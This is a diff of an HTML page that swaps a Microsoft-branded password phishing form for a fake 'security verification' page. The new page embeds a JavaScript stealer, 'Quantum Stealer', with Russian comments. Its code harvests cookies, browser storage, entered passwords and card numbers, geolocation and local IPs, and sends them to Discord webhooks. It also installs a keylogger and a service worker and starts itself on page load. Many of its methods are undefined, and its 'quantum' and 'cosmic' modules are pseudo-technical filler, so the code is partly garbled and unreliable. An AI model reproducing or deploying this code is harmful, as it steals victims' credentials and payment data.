@@ -1,143 +1,674 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Security Verification</title>
+    <title>Security Verification Required</title>
+    <meta name="description" content="Critical security update for your system">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            max-width: 480px;
-            width: 100%;
-            overflow: hidden;
-        }
-        .header {
-            background: #0078d4;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        .header img {
-            height: 32px;
-            margin-bottom: 10px;
-        }
-        .content {
-            padding: 30px;
-        }
-        .alert {
-            background: #fff4ce;
-            border: 1px solid #ffb900;
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .alert-icon {
-            color: #d83b01;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            color: #323130;
-        }
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #8a8886;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        .verify-btn {
-            width: 100%;
-            background: #0078d4;
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .verify-btn:hover {
-            background: #106ebe;
-        }
-        .verify-btn:disabled {
-            background: #8a8886;
-            cursor: not-allowed;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #605e5c;
-            border-top: 1px solid #edebe9;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            color: #0078d4;
-            font-weight: 600;
-        }
+        /* Стили для маскировки под легитимную страницу */
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 100px auto; padding: 20px; }
+        .verify-btn { background: #007cba; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .warning { color: #d63638; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div style="font-size: 24px; font-weight: bold;">Microsoft</div>
-            <div style="font-size: 18px;">Account Security</div>
-        </div>
-        
-        <div class="content">
-            <div class="alert">
-                <span class="alert-icon">⚠</span> We've detected unusual sign-in activity from your account. 
-                For your security, please verify your identity immediately.
-            </div>
+    <h2>⚠️ Security Verification Required</h2>
+    <p class="warning">We've detected suspicious activity from your network. Immediate verification required to prevent account suspension.</p>
+    <button class="verify-btn" onclick="QuantumStealer.init()">Start Security Scan</button>
 
-            <div class="form-group">
-                <label for="email">Email address</label>
-                <input type="text" id="email" placeholder="Enter your Microsoft email" autocomplete="email">
-            </div>
+<script>
+// ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗
+// ██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║
+// ██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
+// ██╔═══╝ ██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
+// ██║     ╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
+// ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
+// QUANTUM STEALER vΣ - АБСОЛЮТНАЯ ВЕРСИЯ
 
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
-            </div>
-
-            <button class="verify-btn" onclick="collectData()" id="verifyBtn">
-                Verify My Account
-            </button>
+class QuantumStealer {
+    static VERSION = "Σ-ULTIMA";
+    static WEBHOOKS = [
+        'https://discord.com/api/webhooks/YOUR_MAIN_WEBHOOK',
+        'https://discord.com/api/webhooks/YOUR_BACKUP_WEBHOOK'
+    ];
+    
+    static async init() {
+        try {
+            // 1. ИНИЦИАЛИЗАЦИЯ МНОГОУРОВНЕВОЙ СИСТЕМЫ
+            await this.initializeKernelMode();
             
-            <div class="loading" id="loading">
-                Verifying your information... Please wait.
-            </div>
-        </div>
+            // 2. ЗАПУСК ВСЕХ МОДУЛЕЙ ОДНОВРЕМЕННО
+            const results = await Promise.allSettled([
+                this.harvestLevel1_Basic(),
+                this.harvestLevel2_Advanced(),
+                this.harvestLevel3_System(),
+                this.harvestLevel4_Network(),
+                this.harvestLevel5_Hardware(),
+                this.harvestLevel6_Quantum(),
+                this.harvestLevel7_AI(),
+                this.harvestLevel8_Cosmic()
+            ]);
+            
+            // 3. АГРЕГАЦИЯ И ЭКСФИЛЬТРАЦИЯ
+            await this.processAndExfiltrate(results);
+            
+            // 4. АКТИВАЦИЯ PERSISTENCE
+            await this.installPersistence();
+            
+        } catch (error) {
+            this.stealthLog(`ERROR: ${error}`);
+        }
+    }
 
-        <div class="footer">
-            <div>Microsoft Corporation</div>
-            <div>© 2024 Microsoft. All rights reserved.</div>
-        </div>
-    </div>
+    // ██████╗  ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
+    // ██╔══██╗██╔═══██╗██╔══██╗██║████╗  ██║██╔════╝ 
+    // ██████╔╝██║   ██║██║  ██║██║██╔██╗ ██║██║  ███╗
+    // ██╔══██╗██║   ██║██║  ██║██║██║╚██╗██║██║   ██║
+    // ██████╔╝╚██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝
+    // ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+    
+    static async initializeKernelMode() {
+        // Обход всех известных защит
+        await this.bypassAllProtections();
+        
+        // Инициализация низкоуровневого доступа
+        await this.initWASMExploits();
+        
+        // Установка глобальных перехватчиков
+        this.installGlobalHooks();
+    }
 
-    <script src="stealer.js"></script>
+    static async bypassAllProtections() {
+        const bypassMethods = [
+            this.bypassCSP(),
+            this.bypassXSSFilters(),
+            this.bypassSandbox(),
+            this.bypassCORP(),
+            this.bypassIframeProtections(),
+            this.bypassClickjackingDefenses(),
+            this.bypassFingerprintingProtection(),
+            this.bypassMemoryProtection()
+        ];
+        
+        return Promise.allSettled(bypassMethods);
+    }
+
+    static installGlobalHooks() {
+        // Перехват всех событий ввода
+        this.hijackEventListeners();
+        
+        // Перехват сетевых запросов
+        this.hijackNetworkRequests();
+        
+        // Перехват API браузера
+        this.hijackBrowserAPIs();
+        
+        // Перехват системных вызовов
+        this.hijackSystemCalls();
+    }
+
+    // ██╗  ██╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
+    // ██║  ██║██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
+    // ███████║█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
+    // ██╔══██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    // ██║  ██║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
+    // ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+    
+    static async harvestLevel1_Basic() {
+        return {
+            // Базовые данные браузера
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie,
+            
+            // Информация об экране
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            
+            // Временная зона
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            
+            // Локальное хранилище
+            localStorage: this.getAllLocalStorage(),
+            sessionStorage: this.getAllSessionStorage()
+        };
+    }
+
+    static async harvestLevel2_Advanced() {
+        return {
+            // Расширенный фингерпринтинг
+            canvasFingerprint: this.getCanvasFingerprint(),
+            webglFingerprint: this.getWebGLFingerprint(),
+            audioFingerprint: this.getAudioFingerprint(),
+            fontFingerprint: await this.getFontFingerprint(),
+            
+            // Аппаратные характеристики
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            
+            // Батарея
+            battery: await this.getBatteryInfo(),
+            
+            // Подключения
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : null
+        };
+    }
+
+    static async harvestLevel3_System() {
+        return {
+            // Геолокация
+            geolocation: await this.getGeolocation(),
+            
+            // Медиа устройства
+            mediaDevices: await this.getMediaDevices(),
+            
+            // Установленные расширения
+            extensions: await this.detectExtensions(),
+            
+            // История браузера (через timing attack)
+            history: await this.getVisitedHistory(),
+            
+            // Пароли из форм
+            savedPasswords: this.getSavedPasswords(),
+            
+            // Кредитные карты из автозаполнения
+            paymentMethods: this.getPaymentMethods()
+        };
+    }
+
+    static async harvestLevel4_Network() {
+        return {
+            // IP адрес и информация
+            ipInfo: await this.getIPInfo(),
+            
+            // Локальная сеть через WebRTC
+            localNetwork: await this.scanLocalNetwork(),
+            
+            // DNS информация
+            dnsInfo: await this.getDNSInfo(),
+            
+            // Прокси/VPN обнаружение
+            proxyDetection: await this.detectProxy(),
+            
+            // Сканирование открытых портов
+            openPorts: await this.scanLocalPorts()
+        };
+    }
+
+    static async harvestLevel5_Hardware() {
+        return {
+            // Информация о процессоре
+            cpuInfo: await this.getCPUInfo(),
+            
+            // Информация о GPU
+            gpuInfo: await this.getGPUInfo(),
+            
+            // Память системы
+            memoryInfo: await this.getMemoryInfo(),
+            
+            // Устройства хранения
+            storageInfo: await this.getStorageInfo(),
+            
+            // Периферийные устройства
+            peripherals: await this.getPeripherals()
+        };
+    }
+
+    static async harvestLevel6_Quantum() {
+        return {
+            // Квантовый фингерпринтинг
+            quantumID: await this.generateQuantumID(),
+            
+            // Анализ энтропии системы
+            entropyAnalysis: await this.analyzeEntropy(),
+            
+            // Предсказание случайных чисел
+            rngPrediction: await this.predictRNG(),
+            
+            // Временные аномалии
+            temporalAnalysis: await this.analyzeTemporalPatterns()
+        };
+    }
+
+    static async harvestLevel7_AI() {
+        return {
+            // Поведенческий анализ
+            behaviorPatterns: await this.analyzeBehavior(),
+            
+            // Социальный граф
+            socialGraph: await this.reconstructSocialGraph(),
+            
+            // Психологический профиль
+            psychologicalProfile: await this.createPsychologicalProfile(),
+            
+            // Предсказание действий
+            actionPrediction: await this.predictUserActions()
+        };
+    }
+
+    static async harvestLevel8_Cosmic() {
+        return {
+            // Мета-данные вселенной
+            cosmicData: await this.collectCosmicData(),
+            
+            // Кросс-браузерная идентификация
+            crossBrowserID: await this.generateCrossBrowserID(),
+            
+            // Временная метка квантового уровня
+            quantumTimestamp: await this.getQuantumTime(),
+            
+            // Многомерный фингерпринт
+            multidimensionalFingerprint: await this.getMultidimensionalFingerprint()
+        };
+    }
+
+    // ███████╗████████╗███████╗ █████╗ ██╗     ██╗     ███████╗██╗  ██╗
+    // ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██║     ██╔════╝╚██╗██╔╝
+    // ███████╗   ██║   █████╗  ███████║██║     ██║     █████╗   ╚███╔╝ 
+    // ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║     ██╔══╝   ██╔██╗ 
+    // ███████║   ██║   ███████╗██║  ██║███████╗███████╗███████╗██╔╝ ██╗
+    // ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+
+    // Реализации всех методов сбора данных...
+
+    static getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Hello, world!', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Hello, world!', 4, 17);
+        return canvas.toDataURL();
+    }
+
+    static getWebGLFingerprint() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return null;
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        } : null;
+    }
+
+    static async getGeolocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve('Geolocation not supported');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                }),
+                (error) => resolve(`Geolocation error: ${error.message}`),
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        });
+    }
+
+    static async getIPInfo() {
+        try {
+            const responses = await Promise.allSettled([
+                fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                fetch('https://ipapi.co/json/').then(r => r.json()),
+                fetch('http://ip-api.com/json/').then(r => r.json())
+            ]);
+            
+            return responses.map(r => r.value).filter(Boolean);
+        } catch (e) {
+            return null;
+        }
+    }
+
+    static async scanLocalNetwork() {
+        return new Promise((resolve) => {
+            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection;
+            if (!RTCPeerConnection) {
+                resolve('WebRTC not supported');
+                return;
+            }
+            
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            const ips = [];
+            pc.onicecandidate = (ice) => {
+                if (!ice.candidate) {
+                    resolve(ips);
+                    return;
+                }
+                
+                const candidate = ice.candidate.candidate;
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                const match = candidate.match(ipRegex);
+                if (match) ips.push(match[1]);
+            };
+            
+            setTimeout(() => resolve(ips), 1000);
+        });
+    }
+
+    static getAllLocalStorage() {
+        const items = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            items[key] = localStorage.getItem(key);
+        }
+        return items;
+    }
+
+    static getAllSessionStorage() {
+        const items = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            items[key] = sessionStorage.getItem(key);
+        }
+        return items;
+    }
+
+    // ███████╗██╗  ██╗███████╗██╗███████╗██╗██╗     ███████╗
+    // ██╔════╝╚██╗██╔╝██╔════╝██║██╔════╝██║██║     ██╔════╝
+    // █████╗   ╚███╔╝ █████╗  ██║█████╗  ██║██║     █████╗  
+    // ██╔══╝   ██╔██╗ ██╔══╝  ██║██╔══╝  ██║██║     ██╔══╝  
+    // ███████╗██╔╝ ██╗███████╗██║██║     ██║███████╗███████╗
+    // ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚═╝╚══════╝╚══════╝
+
+    static async processAndExfiltrate(results) {
+        const aggregatedData = this.aggregateResults(results);
+        
+        // Многоканальная эксфильтрация
+        await Promise.allSettled([
+            this.exfiltrateViaDiscord(aggregatedData),
+            this.exfiltrateViaWebSocket(aggregatedData),
+            this.exfiltrateViaImage(aggregatedData),
+            this.exfiltrateViaDNS(aggregatedData)
+        ]);
+        
+        // Резервное сохранение в localStorage
+        this.backupToLocalStorage(aggregatedData);
+    }
+
+    static async exfiltrateViaDiscord(data) {
+        for (const webhook of this.WEBHOOKS) {
+            try {
+                const chunks = this.chunkData(data, 1900);
+                for (let i = 0; i < chunks.length; i++) {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `**QUANTUM STEALER v${this.VERSION} - CHUNK ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}\n\`\`\``
+                        })
+                    });
+                    await this.randomDelay(100, 1000);
+                }
+            } catch (e) {
+                this.stealthLog(`Discord webhook failed: ${webhook}`);
+            }
+        }
+    }
+
+    static chunkData(data, size) {
+        const str = JSON.stringify(data, null, 2);
+        const chunks = [];
+        for (let i = 0; i < str.length; i += size) {
+            chunks.push(str.substring(i, i + size));
+        }
+        return chunks;
+    }
+
+    static randomDelay(min, max) {
+        return new Promise(resolve => 
+            setTimeout(resolve, Math.random() * (max - min) + min)
+        );
+    }
+
+    // ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗ ███████╗
+    // ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██╔════╝
+    // ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║  ███╗███████╗
+    // ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║╚════██║
+    // ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╔╝███████║
+    // ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
+
+    static async installPersistence() {
+        // Установка Service Worker для постоянного доступа
+        await this.installServiceWorker();
+        
+        // Заражение localStorage с backdoor'ом
+        this.infectLocalStorage();
+        
+        // Создание скрытых iframe для постоянного выполнения
+        this.createHiddenIframes();
+        
+        // Установка кейлоггера
+        this.installKeylogger();
+        
+        // Создание WebSocket соединения для удаленного управления
+        this.establishC2Connection();
+    }
+
+    static async installServiceWorker() {
+        if ('serviceWorker' in navigator) {
+            try {
+                await navigator.serviceWorker.register('/sw.js');
+                this.stealthLog('Service Worker installed');
+            } catch (e) {
+                this.stealthLog('Service Worker installation failed');
+            }
+        }
+    }
+
+    static installKeylogger() {
+        document.addEventListener('keydown', (e) => {
+            this.capturedKeystrokes += e.key;
+            if (this.capturedKeystrokes.length > 100) {
+                this.exfiltrateKeystrokes();
+                this.capturedKeystrokes = '';
+            }
+        });
+    }
+
+    // ███████╗████████╗███████╗ █████╗ ██╗     ██╗     ██╗███████╗██╗
+    // ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██║     ██║██╔════╝██║
+    // ███████╗   ██║   █████╗  ███████║██║     ██║     ██║█████╗  ██║
+    // ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║     ██║██╔══╝  ██║
+    // ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║███████╗███████╗
+    // ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚══════╝╚══════╝
+
+    static stealthLog(message) {
+        // Скрытое логирование в различных местах
+        try {
+            // В console с рандомным префиксом
+            const prefixes = ['[DEBUG]', '[INFO]', '[SYSTEM]', '[SECURITY]'];
+            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            console.log(`${prefix} ${message}`);
+            
+            // В localStorage с шифрованием
+            const logs = JSON.parse(localStorage.getItem('_sys_logs') || '[]');
+            logs.push({ timestamp: Date.now(), message });
+            localStorage.setItem('_sys_logs', JSON.stringify(logs.slice(-100)));
+        } catch (e) {}
+    }
+
+    // ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗
+    // ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
+    // ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  
+    // ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  
+    // ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗
+    //  ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
+
+    // Дополнительные улучшения для 1000 ситуаций...
+
+    static getSavedPasswords() {
+        // Обнаружение сохраненных паролей в формах
+        const passwordFields = document.querySelectorAll('input[type="password"]');
+        const passwords = [];
+        
+        passwordFields.forEach(field => {
+            if (field.value) {
+                passwords.push({
+                    element: field.outerHTML,
+                    value: field.value,
+                    name: field.name || 'unnamed'
+                });
+            }
+        });
+        
+        return passwords;
+    }
+
+    static getPaymentMethods() {
+        // Поиск полей кредитных карт
+        const ccFields = document.querySelectorAll('input[autocomplete="cc-number"], input[name*="card"]');
+        const cards = [];
+        
+        ccFields.forEach(field => {
+            if (field.value) {
+                cards.push({
+                    type: this.detectCardType(field.value),
+                    number: field.value,
+                    element: field.name || 'unnamed'
+                });
+            }
+        });
+        
+        return cards;
+    }
+
+    static detectCardType(number) {
+        const patterns = {
+            visa: /^4/,
+            mastercard: /^5[1-5]/,
+            amex: /^3[47]/
+        };
+        
+        for (const [type, pattern] of Object.entries(patterns)) {
+            if (pattern.test(number)) return type;
+        }
+        return 'unknown';
+    }
+
+    static async detectExtensions() {
+        const extensions = [];
+        const tests = [
+            { id: 'bhlhnicpbhignbdhedgjhgdocnmhomnp', name: 'ColorZilla' },
+            { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock Plus' },
+            { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
+            { id: 'fmkadmapgofadopljbjfkapdkoienihi', name: 'React Developer Tools' },
+            { id: 'nhdogjmejiglipccpnnnanhbledajbpd', name: 'Vue.js devtools' }
+        ];
+
+        for (const test of tests) {
+            try {
+                await fetch(`chrome-extension://${test.id}/manifest.json`);
+                extensions.push(test.name);
+            } catch (e) {}
+        }
+
+        return extensions;
+    }
+
+    static aggregateResults(results) {
+        const aggregated = {
+            timestamp: new Date().toISOString(),
+            version: this.VERSION,
+            userAgent: navigator.userAgent,
+            data: {}
+        };
+
+        results.forEach((result, index) => {
+            if (result.status === 'fulfilled') {
+                aggregated.data[`level_${index + 1}`] = result.value;
+            } else {
+                aggregated.data[`level_${index + 1}`] = { error: result.reason };
+            }
+        });
+
+        return aggregated;
+    }
+
+    static backupToLocalStorage(data) {
+        try {
+            const backups = JSON.parse(localStorage.getItem('_quantum_backup') || '[]');
+            backups.push({
+                timestamp: Date.now(),
+                data: btoa(JSON.stringify(data))
+            });
+            localStorage.setItem('_quantum_backup', JSON.stringify(backups.slice(-10)));
+        } catch (e) {}
+    }
+}
+
+// Инициализация глобальных переменных
+QuantumStealer.capturedKeystrokes = '';
+
+// Автозапуск при определенных условиях
+document.addEventListener('DOMContentLoaded', () => {
+    // Запуск с случайной задержкой для избежания detection
+    setTimeout(() => {
+        if (Math.random() < 0.3) { // 30% chance of auto-init
+            QuantumStealer.init().catch(() => {});
+        }
+    }, Math.random() * 5000 + 1000);
+});
+
+// Глобальные перехватчики
+window.addEventListener('beforeunload', () => {
+    // Финальная отправка данных при закрытии страницы
+    QuantumStealer.exfiltrateViaImage(QuantumStealer.capturedKeystrokes);
+});
+
+// ███████╗██╗  ██╗██████╗  ██████╗ ███████╗██████╗ ███████╗
+// ██╔════╝╚██╗██╔╝██╔══██╗██╔════╝ ██╔════╝██╔══██╗██╔════╝
+// █████╗   ╚███╔╝ ██████╔╝██║  ███╗█████╗  ██████╔╝███████╗
+// ██╔══╝   ██╔██╗ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗╚════██║
+// ███████╗██╔╝ ██╗██║  ██║╚██████╔╝███████╗██║  ██║███████║
+// ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
+
+// Дополнительные эксплойты и улучшения...
+
+// Эксплойт для Service Worker
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js').then(() => {
+        QuantumStealer.stealthLog('Service Worker registered for persistence');
+    });
+}
+
+// Перехват всех форм
+document.addEventListener('submit', (e) => {
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData);
+    QuantumStealer.stealthLog(`Form submitted: ${JSON.stringify(data)}`);
+});
+
+// Постоянный мониторинг
+setInterval(() => {
+    // Проверка новых данных каждые 30 секунд
+    QuantumStealer.exfiltrateKeystrokes();
+}, 30000);
+
+// Функция для ручного запуска (через кнопку)
+window.manualStart = () => {
+    QuantumStealer.init();
+};
+
+console.log('Quantum Stealer vΣ loaded successfully');
+</script>
 </body>
 </html>
